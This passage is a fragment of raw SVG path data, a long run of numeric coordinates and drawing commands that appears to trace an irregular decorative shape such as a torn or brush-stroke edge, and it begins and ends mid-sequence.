.1.2.2.3.3-.2 0-.4 0-.4.1.9.6 2.1.3 3.2 0 .1-.4-.5-.3-.4-.6.7-.2 1.7-.1 1.9.3.5-1 1.7-.4 2.6-.1 1-.5 3.3-.3 3.6-1.1 1 .6 2.3.1 3.4 0 1.5-.1 3-.1 4.4-.5-.2-.1-.3-.3-.3-.5-.5-.1-.7.1-1.1.1-1.4-.5-2.3.4-3.3-.3.2 0 .2-.2.4-.2 2.1-.1 4.3-.1 5.3-1h1.4c.1 0 .2-.1.2-.2s-.1-.1-.2-.1h-1.4c-3 0-6.6.6-8.9.4-.2.1 0 .4-.3.4-.8-.3-1.3-.1-2.1 0-.6.1-1.4-.1-1.8 0-.3.1-.4.3-.7.3-.3 0-.6 0-.9-.1 0-.2 0-.4.1-.6.9-.1 1.7-.3 2.7-.4 1.1-.6 3.6.1 5.5-.4.3-.2-.2-.3.3-.4 1.4-.1 3.7.7 4.9-.2h.3c.1 0 .1 0 .1-.1 0 0 0-.1-.1-.1s-.3 0-.4-.1c-.1-.1-.5 0-.4-.3.5.2 1 .3 1.5.2.2.1.5.1.7.1.2 0 .4 0 .5.1.1 0 .2 0 .2-.1.6 0 1.4-.1 2.2-.2v.8c.9-.8 1.5.5 2.4.2.2-.6.1-.8.2-1.1.3 0 .7-.1 1-.1.5.3.8.9.6 1.7.9-.3 2.4 1.2 3.1-.4.4.8 1.1 1.2 1.8 1.5v-.1c.2.1.4.1.6 0v.1c0 .5.6.1.9.2V38c.5-.1 1 .1 1.5.3.6.2 1.3.5 1.9.2.1 0 .2-.2.2-.4s-.1-.3-.2-.2c-.5.2-1.1 0-1.7-.2-.4-.2-.9-.3-1.4-.3h-.1c-.1-.5-.8-.5-1.1 0h-.5v-.1c-.3-.9-.6-1.7-1.1-2.2.7-.4 1.2 0 1.7.5-.1 0-.1 0-.2.1.1 0 .2.1.3.1.3.3.7.7 1.2.7.1-.3-.2-1.1.1-1.1 1.2.2 2.1.5 3 .9h-.1c-.1 0-.2 0-.2.1 0 0 .1.1.2.1h.6c.2.1.4.1.5.2 0 .1-.2.2-.5.4.3.2 1.2.2 1.8.1.2.1.4.1.5.2 0-.4.4-.4.6-.6 1 1.2 2.7 1.1 3.6.5v.9c1.1-.5 1.5.5 1.7 1.9 1.3 0 2.8.8 4.3.2.3.8.7.4 1.3.9.5-.8-.4-2.2.3-2.6 0 .2.1.3.3.4 0 .1 0 .2.1.3 0 1.1-.1.9-.2 1.7 1.5-.9 3.5.8 4.3.9.8.1 2.5-.9 3 0 .6-.5 1 .3 1.3.9.7-.2 1.6.4 2.4 0 .4 1 1.7.5 2.7.7v-.2c.6-.2 1.3-.1 1.8.1.8.8 2-.4 2.9.3-.1-.8 1.1-.5.9.2 1-.1 1.4.3 2-.2-.1.6 1 .5 1.4.2.9.6 1.6.4 3 .7 0-.6.2-.7.6-.6v.6c1.5-.1 3.3.6 4.3.7-.5-.4 1.1-.2 1.1-.2v.4c1.1.2 2.1.2 2.9-.8-1.3.2-1-2.5-.7-3.2.4.6 1.2.7 1.6.4-.5.2-.1-.6 0-.6.9 2 3.7-.1 4 2.8-.3.3-.9.2-1 .9.5.6 1.5.6 1.9-.2.6.2 1.6.7 2 0-.2-.1-.3-.3-.4-.6.6-.2 1.4 0 1.9-.9-.2 0-.5 0-.4-.4.6-.2.7.5 1.1.7.2-.5.3-1.2.9-1.1.2.5.7.4.6 1.3.6-.3.9.9 1.4.4-.4-.1.6-.8 0-1.1.1.4-.5 0-.6-.2.7-.4.5-.2 0-.6 1.2 0 2.3 0 2.6 1.3 1.9 0 3.5.5 5.1-.4 0-.6-.5-.7-.1-1.3-.5 0-1 .1-1-.7.4.1.5-.4 1-.2-.1-.7.3-.8.2-1.5 1.6-.5 2.8-.8 4.3 0 .4 1.1-.3 1.8-.4 2.2.5 0 .9 0 1 .2-.2.3-.2.5 0 .9 1 .5 1.9-1.1 2.6-.4 0-.4.2-.4.3-.6-.5-.5-1.3-1.5-2-1.5 2.3-2.1 5.1-1 8.3-2.3.5.7 1.3 0 1.6.4 0 1-.4 1.4-.6 2.2 1 1.1 2.3-.5 3.3.4.4-.2.5-1 .9-1.3 1 .2 1.6 1 2.3 0 .5 1.4 1.8-.4 2.7.2.3-.4.4-.9.9-1.1 1.1 1 3.4.8 4.4-.4.5 1.2 2.2.3 2.7.4.7-2.1 2.3-.7 3.7-1.1-.1.6.3.4.3.9h1.1c.3-1.2 2-1.6 2.9-1.1.2.1.4.7.7.9.8.4 1.9.6 2.4-.2.5.7 1.1-.1 2.3.2.1.3.2.7.6.6 1.2-.5 2.4.1 3.3-.8.9.4 2 .5 3.1.5V0H0zm4.9 38.5v-.2c.7 0 1.4.1 2 0 0 .1.1.2.1.4-.7-.1-1.7 0-2.1-.2zm17.4 7.4c-.5-.7-.8-.4-1.7-.4 0-.4-.1-.7-.3-.9.7-.4 1.2.1 2.1 0 .1.4.3.6.3 1.3-.1.1-.3.1-.4 0zm3.2.7H25c-.5 0-.9 0-1.3-.2.4-1 .5-1.4 1.7-1.3-.1.7.3 1.1.1 1.5zm54.7 5.1c-.3.6-1.2.3-1.6.9 0-.6-.8.2-.6-.6-3.4-.1-7.1-.6-11.5-1.4 0-.7.6-.5.6-1.1 1.3.6 2.7-.1 3.8 0 .2 0 .5.4.7.4 1 .1 2.4-.1 4.1.5.8-1.6 3.7-1.9 4.4-.2-.2.6-.9.4-.9 1.3 1-.2.2.7 1 .2zm2.5-.5v.3c-.1.1-.2.2-.2.3 0 .6-.2-.3-.6 0 0-.7.5-.4.8-.6zm-1 3.1c0-.1 0-.2-.1-.2.2-.2.4-.3.7-.2 0 .3 0 .6.1.6-.1.8-.4-.2-.7-.2zm2.3-2.6c-.7-.2-.8-.1-1.4.2.1-.1.1-.2.2-.2h.1v-.1c0-.2 0-.4-.1-.8h.1c.3 0 .3.2.1.4.4.2.2-.7.7-.4-.1.3-.2.4 0 .6.1 0 .2-.2.1-.4.2.1.2.4.2.7zm15.2 5.5c-1 .4-1.7.3-2.4.8v.1c-.4 0-.8-.1-1.2-.1-.3 0-.6 0-.8.1V58c-.5-.2-.9-.8-1.4-.4 0-1.4 1.2-.9 1.3-2.2.6-.1 1.2.1 1.8.3.6.2 1.2.4 1.9.4h.4c-.1.8.5.4.4 1.1zm4.5-2.1c-1.7.2-3.9-.8-5.3.4-.6.1-1.2-.1-1.8-.3-.5-.2-1.1-.4-1.6-.4h-.4c-1.9-.3-3.5-.4-4.8-1.1v-1.1c1.7.1 3.4 0 3.2-2.8.6-.5 1.1.3 1.1 1.3 1.1.1 2.4.8 3.7.5.6 1.1 1 2.7 2.4 2 0-1.2.4-.4.6-1.7.9-.6 1.4-.9 2 .2.8-.3.9.1 1.4.7.1 1.3-.6 1.2-.5 2.3zm134.9-27.3zm.4-.3c-.1 0-.2 0-.1.1l-.1-.1c0-.1 0-.1.1-.2h.2c-.1.1-.1.2-.1.2zm57.1.1c.2 0 .3 0 .4-.1V27.8c.1.4-.3-.1-.3.2-.1-.2-.1-.3-.1-.4zm-.4 2.3v.2c-.2.1-.5.1-.5.3-.2-.1-.4-.2-.7-.3 0-.3.7-.2 1.2-.2zm-.7-3.4c-.6 0 .2-.6 0 0zm.4-2.2c.2-.2 0 0 0 .2 0 .4-.3-.3 0-.2zm.1-2.9s.1 0 .1.1c-.3.1-.6.1-.9.1v-.1c.2-.1.5-.1.8-.1zm-1 0c0 .1 0 .1 0 0l.1.1h-1.3c.4-.1 1-.1 1.2-.1zm-4.2.2s.1 0 0 0c.2-.1.2-.1.2-.2.3-.1.4-.1.1.3.4 0 .6-.1.8-.3.2.1.3.2.3.4 0 0-.1.1-.3.1-.4 0-.7-.2-1.1-.3zm-1.1 14.1c1.1.4 1.8-.2 2.6.1-.1.8-2.3.5-2.7.4-.1-.3.2-.2.1-.5zm2.4 2.4c-.5.5-1.6.2-2.3.3-1.8.1-2.6-.4-4.5-.3h-.1c.1-.1.1-.2.1-.2 2.2-.2 5-.3 6.8.2zm-2.9-8c0 .3-.6.2-.8.1 0-.3.5-.1.8-.1zm-.2 3.4c.2.2-.1.2.3.4-.7.6.2 1.2-.7 1.6 0 .2.5.1.4.3.2.8-1.7.6-2.6.4-.2 0-.8-.3-.4-.5-.3 0-.4.2-.7 0 0-.3.6-.2.4-.7.5-.1 1.1-.3 1.6-.4-.1-.1-.2-.2 0-.2 0-.1-.4 0-.4-.2 0-.7 1.3-.5 2.1-.7zm-3.4-8.5c0 .1-.1.1-.2.1 0-.1.1-.1.2-.1zm-.3.1zm1.1 5.2c0 .7-1.3.1-1.5.5-.2 0-.1-.2-.1-.3.7-.2.8-.6 1.6-.2zm-2-5.3c.2-.3.1.2-.1.1h-.1s.1-.1.2-.1zm-.2 7.2c.4 0 .6-.4 1-.4.3.1 0 .6.5.5 0 .5-.7.5-1 .7-.1-.3-.4-.1-1-.1-.3 0-.6-.2-.8-.2-.2 0-.2.2-.4.2-.5.1-1.3-.2-1.8-.1-.6.1-1 .4-1.6.4-.1-.1-.4-.2-.5-.3-.4.4-1.7.4-2.2.4-.1-.4-.6-.5-1-.7.7-.5 1.8-.3 2.6-.6 0 .2.5.1.5.3 1-.2 2.4-.6 3.6-.5.2 0 .8 0 .8.3.6-.2 1.1-.6 1.3.1zm.9 5.7v.1h-.4l-.1-.1c.2-.1.3-.1.5 0zm-.6.2c-.3 0-.5 0-.5-.2h.3c0 .1 0 .1.1.1s.1.1.1.1zm-1.9 0c0-.1 0-.1 0 0 .4-.2.7-.3.9-.1 0 .2-.8.7-1 .2 0-.1.1-.1.1-.1zm-.2-.1s0 .1-.1.1c-.3.2-.7.3-.8-.2.4.1.3-.3.7-.2 0 .1 0 .1.1.1h.1c.1.1 0 .2 0 .2zm-3.7-2.4c.1.1.2.1.2.1-.9.2-1.8.6-2.6 0-.5.7-1.8.2-2.6.7-.3 0-.3-.3-.1-.4-.4.1-.9.1-1 .4-1.4-.2-1.7.4-2.7-.2 0-.2.2-.2.1-.4-1.7 0-2.6.8-4.7.7.6-.2.2-.4 0-.7.1 0 .2 0 .3-.1.4.2 1.3 0 1.4-.4.9-.1 1.7.3 2.2-.2.5-.1.3.4.7.4.5 0 .5-.3.8-.4 1.3.5 1.6-.4 2.9-.2.2.3.3.3.1.6 1.5 0 2.5-.5 4-.6-.1-.2-.3-.3-.3-.6 1.2-.4 1.5.7 2.5.7 0 .5-.5.3-.8.4 0 0-.1 0-.1-.1h-.1c-.1 0-.1 0-.2.1-.1 0-.1.1 0 .2zm-12.6 4.3h-.4s0-.1-.1-.1c-.1-.2.7-.2.5.1zm-4.8-4.7c.3 0 .2-.3.6-.2.1.3-.2.4-.6.4v-.1-.1zm-.6-6.6c0-.1.1-.2.1-.3 0-.1-.1-.1-.1-.1-.1 0-.1 0-.1.1 0 0 0 .1-.1.1s-.2.1-.2.2c-.4-.3-1 0-1.2.2-.2-.1-.3-.1-.4-.2-.2 0-.2.3-.3.1h-.1c.1-.1.1-.3.1-.4v-.2c1-.4 2 0 3 0v.1h-.1s-.1 0 0 .1h.2v-.1c.2 0 .2-.1.4-.1 0 .1-.1.1-.1.2.9-.2.8 0 1.5.1 0 .1 0 .2-.1.3-.1-.1-.5-.2-.4.1-.2 0-.2-.1-.3-.2 0 .1-1.2-.4-1.8 0zm.4 6.8c-.1 0-.4.1-.9.2-.8-.4.3-.6.9-.2-.1-.1 0-.1 0 0zm-3.6.3c-.3-.5 1-1.1 1.6-.6 0 .5-1.4.1-1.6.6zm1 .7c-.2 0-.3-.1-.3-.3.2 0 .3.1.3.3zm.6-9.6c.1 0 .2-.1.3-.1 0 0 .1 0 .1-.1 0 0 0 .1.1.1 0 .1-.2.1-.5.1zm.8-.3c.1-.1.3-.1.5-.1 0 .1 0 .2.1.2h-.1c-.1 0-.2 0-.1-.1-.1 0-.2.1-.1.2-.1 0-.2-.1-.3-.1v-.1zm.7-.1c0 .1 0 .1 0 0 0 .1 0 .1 0 0zm0 .3zm3.3 10c-.5.5-1.6.6-2.5.4.5-.5 1.8-.5 2.5-.4zm-.6-8c.1-.1.2-.3.1-.5h.1c.7.1 1.5.1 2.1 0 .1 0 .2-.2.3-.2.3 0 0 .2 0 .2.3.1 1.1 0 1.2-.1.1.5-1.3.2-1.4.5-.4-.1-.9-.2-1.4.1-.4-.5-.6.3-1 0zm2.8-2.2c0-.2.3-.1.4-.2h.2c-.2.1-.3.2-.6.2zm1.4-.4h.4v.1l-.2.2c-.3 0-.3 0-.2-.3zm.7 1.9c-.2.4-.6.1-1 .3.4-.3.5-.1 1-.3zm.3-1.2s.1 0 0 0c.1 0 0 0 0 0zm.1.1c0 .1.1.1 0 0l.1.1c-.1.2-.6.2-.5-.1h.4zm-.2-.4c-.2 0-.2-.1-.4-.1l.1-.1c.3.1.7-.1.3.2zm.2 4.4c-.1.6-2 .4-2.6.3.3-.8 1.7-.5 2.6-.3zm-.4 2.3c-.6 0-1.2.2-1.6.1 0-.2.2-.4.3-.6.6 0 1.4-.1 1.3.5zm-2.6 1.8v.3H264.8c-.2.2 0-.4.3-.3zm3.3-8.1zm1.5.8c.4.1-.3.2-.3.3-.5-.2.4-.2.3-.3zm5.2 3.1c-.3.4-1.4.2-1.8.5-.2-.2-.8-.1-1.2-.1-.7.3-1.6.2-1.9-.3 1.5-.4 3.1-.1 4.9-.1zm-1.2-4.8zm.5.1c-.1 0-.1 0-.2-.1.1 0 .1-.1.1-.3.1-.4.1.5.3.1.1.2 0 .3-.2.3zm.2-.9h.4v.1-.1c-.3.2-.3 0-.4 0zm.4 1.8c.6-.2.6.3 0 0zm.1-1.7c0-.1.1-.1.2-.1h.4s-.1.1-.1.2c-.2-.1-.3-.2-.5-.1zm5.8 0l.1-.1h.2c-.1.1-.2.1-.3.1zm1.5 5.2c-.1.2-.9.3-1.2.1 0 0 0-.1-.1-.1.3-.1 1.1-.1 1.3 0zm-1.4-3.7v.2c-.1-.1-.2-.1-.4-.1.1-.3.2-.3.4-.1zm0 3.8l.1.1c-.6 0-.6.1-1-.1 0-.2.7-.1.9 0zm2.2-4.1c.3.1-.4.2-.4.4h-.1c.1-.1.1-.2 0-.4h.1c.1-.2.2.2.4 0zm-.4-1.3h-.3c.2-.1.4-.2.3 0zm-.2 1.5v.1c-.2 0-.4 0-.5.1-.4-.2.2-.3.5-.2zm-3.1-1.4c.5-.2 1-.5 1.6-.6 0 .1-.1.1-.1.2.2 0 .3 0 .4-.1 0 0 .1-.1.1 0h-.1s-.1 0-.1.1c0 0 .1.1.1 0 .1 0 .1 0 .2-.1v.1c.5.1-.5.1 0 .2h.1v.1h-.4c-.1-.1-.2-.1-.3-.1h-.1c-.1 0-.2.1-.2.1-.1 0-.1-.2-.1-.3-.4.2-.8.2-1.1.5h-.2.1l-.1.1c-.2 0 0-.2.1-.2-.4-.2.1 0 .1 0zm-1.3-.7c.2-.2.2-.1.2.1h-.1c-.1 0-.1-.1-.1-.1zm-.6 0c0-.1.2-.1.3 0 0 .1 0 .2.1.3h.4v.1c.2.3 0 .1-.4.2-.2-.3-.1-.3-.5-.2-.3-.4.6-.3.1-.4zm-.3 2.4c-.4.4-.4-.3 0 0zm-.8-.2c.1 0 .1.2.3.2 0 .4-.5-.2-.4.1-.4 0 .2-.1.1-.3zm2.6 3.8c-.6.4-2.1.1-3.4.2.2-.1.2-.4.6-.4-.1.1-.1.2-.1.3.8-.1 2-.3 2.9-.1zm-3.4-3.7c-.1 0 .4.1.4.1 0 .2-.7.2-.4-.1zm-.3-2.1c.2 0 .4-.1.5-.2.1.2 0 .2-.1.3h-.5c.1 0 .1-.1.1-.1zm-.1-.4c-.1.1-.2.1-.2 0h.2zm-.7.1s0 .1.1.1c-.2.1-.4.1-.6.1-.1-.4.3 0 .5-.2zm-.7.4c.1 0 .1 0 .1-.1.2 0 .5 0 .7-.1.1 0 .3.1.4.1v.1c-.3.1-.7.1-1.2 0zm0 .4c.1 0 .1.1.1.1l-.1.1c-.1 0-.1 0-.2-.1 0-.1.1-.1.2-.1-.1 0 0 0 0 0zm-1.1.2h.1c.1-.1.2-.1.2-.3 0-.1-.1-.1-.2-.2l-.1-.1c.3 0 .6.1 1 .1h-.1c-.1 0-.1 0-.2.1v.1h-.1c-.2.1 0 .3.4.4v.1c-.1 0-.2.1-.3.1-.2 0-.3-.1-.3.1h-.1s-.1-.1-.1-.2c-.1 0-.1.1-.1.2h-.2c-.2-.1-.5-.3-.8-.3-.1-.1-.1-.2-.1-.3.2 0 .4-.1.5-.2.1 0 .2-.1.2-.1s.1.1.2.1.1.1.1.1c.1.2.1.2 0 .3 0-.1 0 0 0 0zm-6.5-3.4s.1 0 .1-.1v-.2c.3-.1.5.2.7.2.4.1.7-.4.8 0 .5-.3.8 0 1.2-.3 0 .1-.1.2-.1.3.2 0 .3-.1.3-.3h1.1c-.3.2-.9.2-1.3.3.3 0 .6 0 .5.2-.8.7-2.1.3-3.2 0-.1 0-.1 0-.1-.1-.1.1 0 0 0 0zm-.2-.3c.1.1.1.1.1.2h-.1-.1-.2-.1-.1-.1c.2-.2.6-.1.6-.2zm-2.4-1h.3c0 .1 0 .1.1.2-.2-.1-.4-.1-.5-.2h.1zm-1.7 0h.5c0 .1-.2.2 0 .2-.1.2-.2-.1-.4.1h-.1v-.3zm-.3 0c.1 0 .1 0 0 0h.2v.1h-.3l.1-.1zm-2.3 1c.6.1 2 0 2.5 0 .1.3 1.8.1 2.1.1.2 0 .3.1.3.3.7-.2.9.2 1.1-.1V22l.1.1c0 .1-.1.2-.2.2h-.2l-.1-.1h-.4c-.2 0-.6 0-.7.3l-.1.1h-.5v-.2c-.1-.1-.2-.1-.3-.1h-.1c-.1.1-.2.1-.3 0h-.4c-.4.1-.5 0-1 0 .3.3-.3.1-.8.2.1-.2.2-.3.3-.4-.3 0-.5-.3-1 0v.1c-.1-.1-.3-.1-.4-.1h-.2s0 .1-.1.1c0-.1-.1-.2-.1-.3.2 0 .3 0 .5-.1zm3.4 1.5c.1-.1.2-.1.2-.1h.7c.1 0 .1 0 .1-.1h.6c0 .1.1.2.3.2-.3.3-1.1-.1-1.9.2v-.1c.1 0 0-.1 0-.1zm-1 .2c0-.2.5-.1.8-.2v.1c-.5.2-1.7.1-2.1 0 .3-.3.7-.2 1.2-.1-.1 0-.1.1.1.2zm.5-.6h.1c.1 0 .1 0 .2.1-.1 0-.2 0-.3-.1-.1.1-.2.1-.3.1v-.1h.3zm.1-.3c0-.1.1-.1.2-.1s.3 0 .5-.1v.1c-.1 0-.1.1-.1.1-.2.1-.4.1-.6 0zm1.3.3c0 .1 0 .1 0 0-.2.1-.4 0-.5 0h.5zm.9.1h-.2c-.1 0-.2 0-.3.1h-.1V23h1v.1c-.1-.1-.3-.1-.4-.1zm-.3-.4h.5s-.1 0-.1.1c-.1 0-.2-.1-.4-.1zm-4.8.4c.2 0 .1.1 0 .1.3.2.6.1.3.2h-.3s-.1 0-.1-.1v-.1l.1-.1zm-.2-.6c-.1 0 0 0 0 0v-.2h.3c0 .2-.2.2-.3.2zM245.7 25s.1.1.2.1c0 0-.1 0-.1.1v.1c-.6-.1-.3.2 0 0 .1.2.5.2.9.2.4.2.4-.3 0-.1 0-.1.4-.2 0-.3 0 .1-.2 0-.4 0 .2 0 .5-.1.7-.1l-.1.2c.3 0 .6-.2.8-.2h.7c.6 0 1.3.1 1.8.2.1 0 .1-.1.2-.1h.3c.7 0 1.5.3 2.2.2.2 0 .3-.2.5-.2.3 0 .6.2 1 .2.1 0 .1 0 .2-.1h.6v-.1c.5.1 1.2.3 1.4 0 .1 0 .2.1.1.2H257v-.1c1.3-.2 1.8.3 2.8-.1-.2.4 1.7-.4 2.1.1.1 0 .2-.2 0-.2 0-.2.4 0 .3.2 1.1 0 3.2-.2 4.2-.1.1 0 .3-.2.1-.2.1-.3.4.1.3.3.8-.3 1.6-.3 2.5-.3-.1.1-.1.1-.1.2 0 0 0 .1.1.1h.1v-.1l.2-.2c.6.1.4-.5.8-.2v.1s0 .1.1.1c0 0 .1 0 .1-.1v-.1c.1.1.3.1.5.1.5.1.7 0 1 .1.2-.1.3-.4.4-.5.2 0 .1.1 0 .2-.1 0-.1 0-.2.1 0 .1 0 .1.2.1-.1 0-.2.1-.2.1-.2.1-.3.2-.5.2-.1 0-.1 0-.2.1h-.1H271.2s-.1 0-.1.1c0 0 0 .1.1.1h.6c0 .1.1.3.2.4h-.1v.2c-.6-.1-1.5-.1-1.8-.4-.2.1.3.6-.4.3-.1 0-.2-.1-.3-.2h-.1s-.1 0 0 .1.2.2.3.2c-.1.3-.3-.1-.6 0v-.1s0-.1-.1-.1c0 0-.1 0-.1.1s.1.1.1.2h-.1c-.2 0-.2-.2-.4-.2h-.1c.1-.1.1-.2.1-.3 0 0 0-.1-.1-.1 0 0-.1 0-.1.1v.1c-.5-.1-.6-.1-.9.1h-.2c-.3 0-.2-.3-.7-.3 0 .2.3.1.3.3-.3-.2-.2 0-.4.1h-.4c-.4 0-.8-.1-.5-.3-.4.1 0 .3-.4.4-.3.1-.6-.3-.7 0-.2 0-.2-.2-.3-.3 0 .2-.2.2-.4.4h-.2v-.2l-1.8-.3c-.2.2-.4.4-.7.5h-.1c-.2 0-.4.1-.7 0h-.1c-.2 0-.5 0-.7.1 0 0-.1 0-.1.1-.1 0-.2.1-.2.1-.1 0-.2.1-.3.1 0-.2-.4.1-.5-.2H258.8l.1-.1s0-.1-.1-.1h-.8c-.1-.1-.3-.2-.5-.2s-.4 0-.6.1c-.1 0-.1-.1-.1-.2-1.1-.1-2.2 0-3.3 0-.2-.1-.5-.1-.7 0-.7 0-1.4-.1-2-.2-.2.3-.5.1-.8.1-.2 0-.4.2-.5.2-.3 0-.4-.3-.8-.3h-1c-.1 0-.3-.1-.5-.1-.1 0-.1.1-.2.1-.4 0-.8 0-1-.2.1 0 .2 0 .3-.1v-.1h-.1c-.1 0-.1 0-.2.1 0 0-.1-.1-.2-.1s-.2.2 0 .2c-.2.2-.6.1-.9 0-.1-.1-.1-.2-.1-.3h.2s.1 0 .1-.1c0 0 0-.1-.1-.1h-.2-.1-1.2c-.1 0-.2 0-.4-.1h-.1v-.1c.5.3 1.7.2 2.7.3zm11.8 1.4c-.4 0-.5.1-.5.3-.2 0-.2-.1-.3-.2.2-.1.6-.2.8-.1zm-7.6.8h-.4-.1c.2 0 .6-.2.5 0zm-3.1.2c-.1.1-.2.1-.3 0h.3zm-.6.5c-.1.5-.2-.3-.6-.2-.1-.1-.1-.1-.1-.2 0 0 0-.1.1-.1 0 0 0 .1.1.1 0 0 .1 0 .1-.1v-.1h.1c.1 0 .2 0 .3.1 0 0 .1.1.2.1-.3.1-.3.3-.2.4zm-2.8-2.2c-.1 0-.1 0 0 0l-.2-.2h1.1c0 .1.1.2.1.3-.6-.1-.5-.1-1-.1zm-.6.1c0-.1 0-.2-.1-.3v-.1h.2c0 .1.1.2.2.3l.1.1h-.1-.3zm.4 1.5l-.1.1h-.1s0-.1-.1-.1h.1c0-.1.1 0 .2 0zm-.8-1.9h.1V25.7c-.1 0-.2.1-.3.1.1-.1.3-.2.2-.4zm1.5-2.8c.1-.1.3-.1.5 0l-.3.3c.1-.3 0-.3-.2-.3zm-.1.1l.1.1h-.1c-.8-.1-.8 0-1.6 0 .5-.3.9-.2 1.6-.1zm-3.3 5.1c-.5-.1.2-.2.1-.3.4.1-.2.2-.1.3zm.7-.7c-.1 0 .4.1.4.1 0 .2-.8.2-.4-.1zm-.2-1.4c-.1 0-.2-.1 0-.1 0-.1-.2-.1-.3 0-.4 0 .2-.2 0-.4.2.1.5.6.4 0 .1 0 .1.1.1.1 0 .2.1.2.3.1.1 0 .1 0 .2.1-.2.2-.5-.1-.7.2zm1-.4c-.2-.1-.3-.1-.4-.1h-.1l-.1-.1c-.3-.3.8-.1 1.1-.1v.2h-.2c-.1 0-.3 0-.3.1zm.5 2.4c.3-.2 0-.3-.3-.4-.3-.2.3 0 .5.1l.1.1h.1c.1 0 .2 0 .2-.1l.2-.2v.1h.3c.3-.2-.2.2-.4.2 0 .2.6.1.7 0h.1c-.4.4-.8.2-1.5.2zm1.8-.1c-.1-.1-.3-.1-.4-.2.2-.2.4.1.7-.1h.1c-.1.1-.1.2-.1.3-.1 0-.1.1-.2.1 0-.1-.1-.1-.1-.1zm.2.2s.1-.1 0 0c.1-.1.2-.1.2-.2v-.1-.1h.5c0 .1.1.2.2.3-.3.1-.5.1-.9.1zm1.8 7.3v.1c-.2.1-.7.1-1.1.1-.1-.3.4-.2.3-.5.4.1.5-.1.8.3V35c.1 0 0 .1 0 .1zm.2-7.6h.4l.1.1-.1.1h-.4c-.1 0-.1-.1 0-.2zm.1 7.8v-.2H246.9v.2h-.3zm.3-7.4c0-.1.1-.2.1-.2l-.1-.1v-.1h.1c.2 0 .2.2.2.4.7-.1-.2-.6.5-.3v.1s0 .1.1.1c0 0 .1 0 .1-.1v-.1c.3.3.7-.2.8.2.1 0 .2-.1.1-.2.2 0 .2.2.4.2s.2-.2.4-.2h.4c.6-.1 1.3.2 1.8-.1.1.4.1-.1.5.1h.1s-.1.1-.1.2c0 0 0 .1.1.1h.1s0-.1.1-.1c.3-.1.2-.1.6 0h.1s-.1.1-.1.2c0 0 0 .1.1.1h.1V28c.8 0 1.4.1 2.7 0v.2c.2 0 .3-.1.5-.1h.1c0 .1-.1.1-.1.2v.1s0 .1.1.1c0 0 .1 0 .1-.1v-.1-.1c.4-.1.5 0 .9 0v.6c-.4-.1-.7-.1-1.2.2.1-.5-.8.4-.8-.2.2 0 .2.1.4.1-.3-.6-.9.4-1.1-.4-.4.2 0 .3-.4.3s.3-.3-.3-.2c-.1.5-1.9-.6-2.2.2-.2-.4-.7-.2-.8-.2-.1 0-.3-.6-.4-.1 0 .1-.2-.3-.5-.4-.4.1.1.2 0 .4-.2-.1-.6-.1-1-.1.3.3-.3 0-.5.3h-.1c.1-.1.2-.2.3-.2h.1s0-.1-.1-.1h-.1c-.2 0-.3.1-.4.2-.4-.2-1.2-.3-1.2 0-.2-.4-.4-.5-.5-.7zm7.6 7.2c.4 0 .5.1.8.2-.1.4-.7.4-1 .7-.2-.1-.3-.2-.4-.3 0-.5.8-.2.6-.6zm-2.3.5c-1 0-2.2.5-2.1-.2-.1-.1-.8.4-.8-.2.8-.3 2.7-.9 2.9.4zm-4.9-.3v-.2-.2c.5-.1.5.3.8.3-.1.2-.6.3-.8.1zm1.2 5.8c.3-.7 1.9-1.3 2.2-.5 0 .9-1.5 1-2.2.5zm6.1-.5c-.3-.1-1 .2-.8-.2.3 0 1-.2.8.2zm6.6 2.7c-1.2.3-2.5.3-4 .1 0-.2-.5-.1-.5-.2.9-1.1 3.8-.3 5-.3-.1.3-.2.4-.5.4zm9.6-1.4c-.2-.3.4-.1.4-.3.2 0 .4 0 .6-.1.3 0 .7 0 1-.1.2.1.4.1.6.1h.3c-.1.9-1.7.2-2.9.4zm6.4 0c-.7-.1-1.7.3-1.4-.5.5-.3 1.4-.2 1.8.1 0 .2-.3.2-.4.4zm14 .4c0-.1 0-.2.1-.2 0-.2-.7.1-.8.2-.2 0-.3-.2-.3-.4-.3.2-1.3-.2-1.8-.1-.2 0-.2.2-.4.2-1.5 0-3-.5-4.4-.5-.5 0-1.3.5-1.2-.1-.4 0-.7 0-.8.2-.3-.2-.2-.3-.1-.5 1-.3 2.2.1 3 .1.1 0 .1-.1.1-.2 1.3-.1 2.5 0 3.8 0h.3c1.1.2 2 0 2.9.7.6-.3 1.5-.5 1.5.3-.7.2-1.1.5-1.9.3zm.8-1.5c-.9-.4-2.2-.3-3.2-.1h-.4c-.8 0-1.6-.1-2.5-.1h-1.5c-2.1-.7-4.4-.2-6.7-.5-.2.1-.4.2-.7.3-1-.1-1.6-.1-2.6-.1-.1.1-.1.5-.1.8-.3 0-.5.1-.5.2-.2-.1-.3-.1-.5 0h-.4c0-.1 0-.1.1-.2v-.2h-.1c-.1 0-.1 0-.1.1-.1.1-.1.2-.1.2-.3.1-.6.1-.9.1-.2 0-.5 0-.7.1-.3-.1-.7-.1-.7-.4.3-.2.8-.1 1-.3.2-.1.4-.1.7-.1.1 0 .1 0 .1-.1 0 0 0-.1-.1-.1h-.2c-.2 0-.4 0-.6.1v-.1c-.2.1-.5-.1-.7-.1-1 0-2.2.3-3.3.4-.3 0-.6-.1-1-.1-2-.1-4.6.6-5.1 0 .1 0 .3-.1.3-.2s0-.1-.1-.2h-.1c-.1 0-.1 0-.1.1 0 0-.1 0-.2.1h-1.1c0-.3-.4-.3-.3-.7-1.9.2-3.3-.4-4.7.4-1.2-.2-1.8-1-3.1-.5 0-.1-.3-.1-.4-.2-1.1.3-2.8.4-3.6-.2.3-.7 1.6.1 2.1-.3.3.1.4.2.7.3.8 0 1.1 0 1.8-.2-.1.3.3.2.5.2s.5-.3.1-.3c1.4-.2 3.4.2 5.1.1 0 .1.2.2.1.4 1.1 0 1.6.3 2.2-.3.5.2.9 0 1.2.1.2 0 0-.1 0-.3h1.2c-.2.5.2.5.4.5.1.4-.3.6-.7 1 .4.4 1.8-.2 2.3-.3.3.1.5.1.8 0 .7-.1.1-.3.1-.5 0-.1.3-.3.3-.3-.1-.3-.7-.2-.4-.5.5-.2 1-.5 1.9-.4 0 .4-.5.5-.7.7 0 .2.4.1.4.3.2-.1.5-.1.5-.3 1.7.2 3.1-.5 4.5 0 .3 0 .6-.1.8-.2.6.1.4.2 1.1.2.2 0 .1-.2.1-.3 1.7-.3 2.3-.1 3.6.1.2-.2-.1-.4-.1-.8.2 0 .2-.1.3-.2.6 0 .7.3 1.4.2 0 .1 0 .3.1.3-.1.1-.1.4-.5.3 1 .5 2.7-.3 3.4.5 1.2-.3 2 0 3.2 0 .5-.2-.4-.3 0-.5.3 0 